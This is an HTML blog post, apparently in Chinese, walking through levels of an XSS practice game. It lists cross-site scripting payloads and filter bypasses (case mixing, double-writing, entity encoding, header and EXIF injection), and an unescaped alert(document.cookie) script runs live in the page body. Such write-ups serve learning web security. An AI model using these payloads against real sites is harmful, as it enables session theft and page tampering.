@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="在BUU上做了一道关于前端的题目，完全看不懂wp。赶紧恶补一下前端的漏洞   这种前端的题目，建议直接看网络传过来的html源码，（浏览器有一定的容错能力，他会补足不完整的标签）查看器会自动作出改变。    常见的xss payloadalert(document.cookie) 123456&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;svg&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS 小游戏">
+<meta property="og:url" content="http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="在BUU上做了一道关于前端的题目，完全看不懂wp。赶紧恶补一下前端的漏洞   这种前端的题目，建议直接看网络传过来的html源码，（浏览器有一定的容错能力，他会补足不完整的标签）查看器会自动作出改变。    常见的xss payloadalert(document.cookie) 123456&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;svg&amp;#x">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005454.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005509.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005537.jpeg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005553.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005609.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005622.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005634.png">
+<meta property="article:published_time" content="2020-03-19T17:45:34.000Z">
+<meta property="article:modified_time" content="2021-02-16T16:56:43.547Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005454.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>XSS 小游戏</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/23/V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bwp/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/19/HTML%E5%9F%BA%E7%A1%80/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&text=XSS 小游戏"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&is_video=false&description=XSS 小游戏"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS 小游戏&body=Check out this article: http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&name=XSS 小游戏&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&t=XSS 小游戏"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84xss-payload"><span class="toc-number">1.</span> <span class="toc-text">常见的xss payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">1.0.1.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-number">1.0.2.</span> <span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3"><span class="toc-number">1.0.3.</span> <span class="toc-text">第七关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E5%85%B3"><span class="toc-number">1.0.4.</span> <span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%85%B3"><span class="toc-number">1.0.5.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%B3"><span class="toc-number">1.0.6.</span> <span class="toc-text">第十关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3"><span class="toc-number">1.0.7.</span> <span class="toc-text">第十一关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3"><span class="toc-number">1.0.8.</span> <span class="toc-text">第十二关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3"><span class="toc-number">1.0.9.</span> <span class="toc-text">第十三关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3"><span class="toc-number">1.0.10.</span> <span class="toc-text">第十四关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3%EF%BC%88%E4%B8%8D%E7%9F%A5%E6%80%8E%E4%B9%88%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">1.0.11.</span> <span class="toc-text">第十五关（不知怎么没有成功）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3"><span class="toc-number">1.0.12.</span> <span class="toc-text">第十六关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3"><span class="toc-number">1.0.13.</span> <span class="toc-text">第十七关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3%E5%92%8C%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3"><span class="toc-number">1.0.14.</span> <span class="toc-text">第十九关和第二十关</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.0.14.0.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XSS 小游戏
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Elli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-19T17:45:34.000Z" itemprop="datePublished">2020-03-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>在BUU上做了一道关于前端的题目，完全看不懂wp。赶紧恶补一下前端的漏洞</p>
+</blockquote>
+<blockquote>
+<p>这种前端的题目，建议直接看网络传过来的html源码，（浏览器有一定的容错能力，他会补足不完整的标签）查看器会自动作出改变。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005454.png" alt="net"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005509.png" alt="ele"></p>
+</blockquote>
+<h2 id="常见的xss-payload"><a href="#常见的xss-payload" class="headerlink" title="常见的xss payload"></a>常见的xss payload</h2><script>alert(document.cookie)</script>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;svg&#x2F;οnlοad&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 οnerrοr&#x3D;alert(1)&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;test&lt;&#x2F;a&gt;</span><br><span class="line">&lt;p οnclick&#x3D;&#39;alert(1)&#39;&gt;test&lt;&#x2F;p&gt; #点击触发事件</span><br><span class="line">&lt;p οnmοuseοver&#x3D;&#39;alert(1)&#39;&gt;test&lt;&#x2F;p&gt; #移动鼠标触发事件</span><br></pre></td></tr></table></figure>
+<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>htmlspecialchars()转义成HTML实体<br>但是htmlspecialchars在默认情况下不会转义单引号，需要设置quotestyle才会进行转义<br><code>&#39;onclick=&#39;window.alert()</code></p>
+<h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p>大小写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img Src&#x3D;x Onerror&#x3D;alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;scRipt&gt;alert(&#39;xss&#39;)&lt;&#x2F;ScrIpt&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p>双写绕过<br><code>&quot;&gt;&lt;scscriptript&gt;alert(&#39;xss&#39;)&lt;/scrscriptipt&gt;</code></p>
+<h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p>伪协议<br>编码的形式绕过<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML字符在线实体转换</a><br><code>javascri&amp;#x70;t:alert(&#39;xss&#39;)  #HTML实体编码（HEX）</code><br>这是实体编码 entity code<br>「&amp;#」开头的后接十进制数字，「&amp;#x」开头的后接十六进制数字。</p>
+<blockquote>
+<p>字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。<br>这么做的目的主要有两个：<br>１、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：<br>小于号这样写：&lt; 或 &#60;<br>大于号这样写：&gt; 或 &#62;<br>前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1字符集（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。<br>２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。</p>
+</blockquote>
+<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>需要添加http:// 有strpos($str7,’http://‘)<br><code>javascri&amp;#x70;t:alert(&#39;xss&#39;)&lt;!--http://--&gt;</code></p>
+<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p><code>&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code><br>onclick 事件会在对象被点击时发生。</p>
+<h4 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h4><p>在Referer中写<br><code>t_sort=&quot;onclick=&#39;window.alert()&#39;type=&#39;text&#39;&quot;</code></p>
+<h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><p>在User-agent中加入<br><code>&quot;onclick=&#39;alert()&#39;type=&#39;text&#39;</code></p>
+<h4 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h4><p>cookie中加入</p>
+<h4 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h4><p>exif（照片信息） xss<br><code>’ &quot;&gt;&lt;img src=x onerror=alert(404)&gt;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005537.jpeg" alt="exif"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005553.png" alt="exif1"></p>
+<h4 id="第十五关（不知怎么没有成功）"><a href="#第十五关（不知怎么没有成功）" class="headerlink" title="第十五关（不知怎么没有成功）"></a>第十五关（不知怎么没有成功）</h4><p><code>?src=&#39;level1.php?name=test&amp;#x3C;img src=x onerror=alert(404)&amp;#x3E;&#39;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005609.png" alt="level15"></p>
+<h4 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h4><p>过滤了空格，可以回车编码绕过<br>%0d和%0a表示回车换行<br><code>?keyword=&lt;img%0asrc=x%0aonerror=alert(404)&gt;</code></p>
+<h4 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h4><p>%20为空格，可以断开源码的结构<br><code>?arg01=a&amp;arg02=%20onmouseover=alert(%27xss%27)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005622.png" alt="level17"></p>
+<h4 id="第十九关和第二十关"><a href="#第十九关和第二十关" class="headerlink" title="第十九关和第二十关"></a>第十九关和第二十关</h4><p>flash xss<br>不会<br><code>?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt;xss_by_SST&lt;/a&gt;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217005634.png" alt="level19"></p>
+<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h6><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaonuoqi/p/11396644.html">https://www.cnblogs.com/gaonuoqi/p/11396644.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/91345651">https://blog.csdn.net/weixin_44677409/article/details/91345651</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84xss-payload"><span class="toc-number">1.</span> <span class="toc-text">常见的xss payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">1.0.1.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-number">1.0.2.</span> <span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3"><span class="toc-number">1.0.3.</span> <span class="toc-text">第七关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E5%85%B3"><span class="toc-number">1.0.4.</span> <span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%85%B3"><span class="toc-number">1.0.5.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%B3"><span class="toc-number">1.0.6.</span> <span class="toc-text">第十关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3"><span class="toc-number">1.0.7.</span> <span class="toc-text">第十一关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3"><span class="toc-number">1.0.8.</span> <span class="toc-text">第十二关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3"><span class="toc-number">1.0.9.</span> <span class="toc-text">第十三关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3"><span class="toc-number">1.0.10.</span> <span class="toc-text">第十四关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3%EF%BC%88%E4%B8%8D%E7%9F%A5%E6%80%8E%E4%B9%88%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">1.0.11.</span> <span class="toc-text">第十五关（不知怎么没有成功）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3"><span class="toc-number">1.0.12.</span> <span class="toc-text">第十六关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3"><span class="toc-number">1.0.13.</span> <span class="toc-text">第十七关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3%E5%92%8C%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3"><span class="toc-number">1.0.14.</span> <span class="toc-text">第十九关和第二十关</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.0.14.0.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&text=XSS 小游戏"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&is_video=false&description=XSS 小游戏"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS 小游戏&body=Check out this article: http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&title=XSS 小游戏"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&name=XSS 小游戏&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/03/20/XSS-%E5%B0%8F%E6%B8%B8%E6%88%8F/&t=XSS 小游戏"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
